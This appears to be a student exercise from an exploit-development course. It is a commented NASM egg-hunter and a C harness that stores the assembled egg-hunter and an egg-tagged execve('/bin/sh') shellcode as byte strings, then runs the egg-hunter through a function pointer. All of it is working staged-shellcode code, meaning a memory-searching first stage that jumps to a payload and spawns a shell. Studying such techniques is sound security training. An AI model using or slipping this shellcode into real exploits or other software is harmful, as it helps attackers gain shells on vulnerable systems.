/*
; Filename: 	egghunter.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This is the first stage of our payload. An egg-hunter shellcode
;		looping through memory and jumping on the payload after the
;		second egg found in memory.

global _start			

section .text

_start:

	xor ecx, ecx
	mul ecx

next_page:
	or dx, 0xfff

next_addr:
	; EDX is 4096 here, that is the value of PAGE_SIZE constant
	inc edx

	; EBX is our memory cursor
	lea ebx, [edx+0x4]

	xor eax, eax

	; access is defined as #define __NR_acces 33 in 
	; /usr/include/i386-linux-gnu/asm/unistd_32.h:
	;
	; system call prototype is: 
	; int access(const char *pathname, int mode);

	mov al, 0x21
	int 0x80

	cmp al, 0xf2		; 0xf2 is the opcode for EFAULT. If my register
				; has this value, a signal for a invalid page
				; access it has been received
	jz next_page

	mov eax, key
	mov edi, edx
	scasd

	jnz next_addr
 
	scasd
	jnz next_addr

	; At this point we are at the very beginning of our shellcode, after
	; the second key. We can jump to it
	jmp edi

section .data
	key equ 0xdeadbeef
 */

#include<stdio.h>
#include<string.h>

unsigned char egg_hunter[] = \
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x74\xed\xb8\xef\xbe\xad\xde\x89\xd7\xaf\x75\xe8\xaf\x75\xe5\xff\xe7";

unsigned char code[] = \
"\xef\xbe\xad\xde\xef\xbe\xad\xde\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80";

		       
int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	printf("Egghunter Length:  %d\n", strlen(egg_hunter));
	int (*ret)() = (int(*)())egg_hunter;
	ret();
}

	
